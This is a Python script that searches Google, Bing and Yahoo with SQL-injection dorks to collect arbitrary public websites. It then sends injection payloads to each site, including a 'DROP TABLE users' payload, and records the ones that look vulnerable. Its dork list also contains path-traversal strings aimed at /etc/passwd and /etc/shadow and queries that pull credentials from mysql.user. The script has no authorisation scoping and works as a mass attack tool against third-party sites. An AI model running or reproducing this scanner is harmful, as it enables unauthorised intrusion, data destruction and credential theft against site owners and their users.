import requests
from bs4 import BeautifulSoup
import random
import time
import logging
import os
import signal
import sys
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urljoin

# Setup logging for better debugging and tracking
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Configuration
SEARCH_ENGINES = {
    "bing": "https://www.bing.com/search?q={}&first={}",
    "google": "https://www.google.com/search?q={}&start={}",
    "yahoo": "https://search.yahoo.com/search?p={}&b={}",
}

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Safari/605.1.15",
    # More user agents can be added here to simulate various browsers
]

# Expanded list of SQL injection dorks (extensive collection)
SQL_INJECTION_DORKS = [
    "index.php?id=", "news.php?id=", "article.php?id=", "product.php?id=", "view.php?id=", 
    "category.php?id=", "page.php?id=", "details.php?id=", "blog.php?id=", "single.php?id=", 
    "search.php?id=", "list.php?id=", "portfolio.php?id=", "shop.php?id=", "cart.php?id=", 
    "newsdetail.php?id=", "index.php?cat=", "page.php?cat=", "filter.php?id=", "show.php?id=", 
    "load.php?id=", "t.php?id=", "post.php?id=", "'", '"', "--", ";", "#", "admin", "login", "user", 
    "dashboard", "controlpanel", "configuration", "wp-content/plugins/", "wp-admin/", "mysql_connect()", 
    "OR 1=1", "UNION SELECT", "SELECT * FROM", "FROM users", "FROM orders", "UNION ALL SELECT", "GROUP_CONCAT", 
    "WHERE 1=1", "AND 1=1", "OR 1=1", "AND 1=2", "AND 1=3", "OR 1=0", "AND user=", "AND password=",
    "AND id=", "AND table_name=", "AND column_name=", "AND column_name LIKE", "AND 1=1--", "AND 1=1#", 
    "AND id=1", "AND username='admin'", "AND password='password'", "ORDER BY", "HAVING", "CHAR(65,66,67)",
    "SLEEP(5)", "BENCHMARK", "EXTRACTVALUE", "XMLAGG", "FROM information_schema.tables", "FROM mysql.db", 
    "OR 1=1 LIMIT 1", "INTO OUTFILE", "INFORMATION_SCHEMA", "LOAD_FILE", "LOAD_FILE('/etc/passwd')", 
    "CONCAT", "MD5", "SHA1", "BASE64_ENCODED", "SUBSTRING_INDEX", "SUBSTRING", "INTO DUMPFILE", 
    "INTO OUTFILE", "LIMIT 0,1", "UNION SELECT NULL, NULL, NULL, NULL, NULL", "SELECT NULL FROM users", 
    "SELECT username, password FROM users", "EXTRACTVALUE(1,CONCAT(0x20,username,0x20))", "SUBSTRING(@@version,1,1)",
    "CONCAT(user(),database())", "SELECT * FROM information_schema.tables", "SELECT table_name FROM information_schema.tables",
    "SELECT * FROM mysql.user", "SELECT host, user, password FROM mysql.user", "AND 1=1--",
    "SLEEP(5)", "WAITFOR DELAY '0:0:5'", "IF(1=1,SLEEP(5),0)", "SELECT CASE WHEN (1=1) THEN SLEEP(5) END", 
    "OR 1=1#",
    # Blind SQLi (time-based and error-based payloads)
    "SLEEP(5)", "WAITFOR DELAY '0:0:5'", "IF(1=1,SLEEP(5),0)", "SELECT CASE WHEN (1=1) THEN SLEEP(5) END",
    "OR 1=1#",
    # Path Traversal and file-based payloads
    "/../../../../etc/passwd", "/../../../etc/shadow", "/../etc/passwd", "file:///", "file://localhost/",
    "INTO OUTFILE '/tmp/file.txt'",
    # New SQLi techniques
    "AND substring(@@version,1,1)=5--", "AND 1=1 HAVING 1=1--", "OR 1=1 LIMIT 1",
]

DELAY = 2  # Delay between requests in seconds
MAX_WORKERS = 10  # Max workers for parallel scanning
RESULTS_FILE_INJECTION = "injection.txt"
RESULTS_FILE_NOINJECTION = "NOinjection.txt"
RESULTS_FILE_ALL_WEBSITES = "websites.txt"

# Signal handler for graceful exit (Ctrl+C)
def signal_handler(sig, frame):
    logger.info("\nGracefully exiting. Saving results...")
    save_results(injection_urls, no_injection_urls, all_urls)
    sys.exit(0)

# Setup signal handler for graceful exit (Ctrl+C)
signal.signal(signal.SIGINT, signal_handler)

# Function to save results to the respective files
def save_results(injection_urls, no_injection_urls, all_urls):
    try:
        # Save injection URLs
        if injection_urls:
            with open(RESULTS_FILE_INJECTION, "a") as f:
                for url in injection_urls:
                    f.write(url + "\n")
            logger.info(f"Injection URLs saved to {RESULTS_FILE_INJECTION}")

        # Save non-injection URLs
        if no_injection_urls:
            with open(RESULTS_FILE_NOINJECTION, "a") as f:
                for url in no_injection_urls:
                    f.write(url + "\n")
            logger.info(f"Non-injection URLs saved to {RESULTS_FILE_NOINJECTION}")

        # Save all discovered websites
        if all_urls:
            with open(RESULTS_FILE_ALL_WEBSITES, "a") as f:
                for url in all_urls:
                    f.write(url + "\n")
            logger.info(f"All discovered URLs saved to {RESULTS_FILE_ALL_WEBSITES}")
    except Exception as e:
        logger.error(f"Error saving results: {e}")

# Function to test SQL injection vulnerability
def test_sql_injection(url):
    payloads = [
        "' OR 1=1 --",  # Classic SQL Injection (Boolean-based)
        "' OR 'a'='a",  # Another simple Boolean-based
        "1' AND 1=1 --",  # Basic time-based or error-based
        "1' OR 1=1 --",  # Another boolean-based attack
        "'; DROP TABLE users --",  # Potential SQL Injection Drop Table payload
        "1; SELECT * FROM users --"  # Attempt to pull data from a table
    ]
    
    headers = {'User-Agent': random.choice(USER_AGENTS)}
    
    for payload in payloads:
        try:
            response = requests.get(url + payload, headers=headers, timeout=10)
            
            # Look for common SQL error patterns or suspicious behavior
            if "error" in response.text.lower() or "mysql" in response.text.lower():
                logger.info(f"SQL Injection vulnerability found at: {url}")
                return True  # Found vulnerability
            if response.status_code == 500:  # Common error code for SQLi
                logger.info(f"Potential SQL Injection (500 error) at: {url}")
                return True  # Potential SQLi
            if response.text.find("sql") > -1:  # Some SQL error messages could hint at vulnerability
                logger.info(f"Potential SQL Injection (SQL keyword found) at: {url}")
                return True  # Potential SQLi
        except requests.exceptions.RequestException as e:
            logger.error(f"Error testing {url} with payload {payload}: {e}")
            continue

    return False  # No SQL injection found after testing all payloads

# Function to search with SQL injection dorks
def search_with_dork(search_engine, dork, num_results=100):
    results = []
    start = 0
    while len(results) < num_results:
        url = SEARCH_ENGINES[search_engine].format(dork, start)
        headers = {'User-Agent': random.choice(USER_AGENTS)}
        try:
            response = requests.get(url, headers=headers, timeout=10)
            response.raise_for_status()  # Raise HTTPError for bad responses (4xx or 5xx)
            soup = BeautifulSoup(response.content, "html.parser")
            links = []
            if search_engine == "google":
                links = [a['href'] for a in soup.find_all("a", href=True) if "http" in a['href'] and "google" not in a['href']]
            elif search_engine == "bing":
                links = [a['href'] for a in soup.find_all("a", href=True) if "http" in a['href']]
            elif search_engine == "yahoo":
                links = [a['href'] for a in soup.find_all("a", href=True) if "http" in a['href']]
            results.extend(links)
            start += 10  # Adjust based on search engine pagination
            time.sleep(DELAY)
            if not links:  # Break if no links found
                break
        except requests.exceptions.RequestException as e:
            logger.error(f"Error during search: {e}")
            break
    return list(set(results))  # Remove duplicates

# Function to scan and classify websites
def scan_and_classify_websites(search_engine, dork):
    logger.info(f"Scanning with {search_engine} using dork: {dork}")
    results = search_with_dork(search_engine, dork)
    
    injection_urls = []
    no_injection_urls = []
    all_urls = []

    for url in results:
        logger.info(f"Testing URL: {url}")
        all_urls.append(url)
        if test_sql_injection(url):
            logger.info(f"SQL Injection vulnerability found: {url}")
            injection_urls.append(url)
        else:
            logger.info(f"No SQL Injection vulnerability: {url}")
            no_injection_urls.append(url)
    
    # Save the results after processing
    save_results(injection_urls, no_injection_urls, all_urls)

# Main entry point
if __name__ == "__main__":
    logger.info("Starting SQL Injection Scan...")

    # Initialize lists to store results
    injection_urls = []
    no_injection_urls = []
    all_urls = []

    # Use ThreadPoolExecutor for parallel scanning
    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        for search_engine in SEARCH_ENGINES:
            for dork in SQL_INJECTION_DORKS:
                executor.submit(scan_and_classify_websites, search_engine, dork)

    # After scan, save results
    logger.info("Scan completed. Saving results...")
    save_results(injection_urls, no_injection_urls, all_urls)
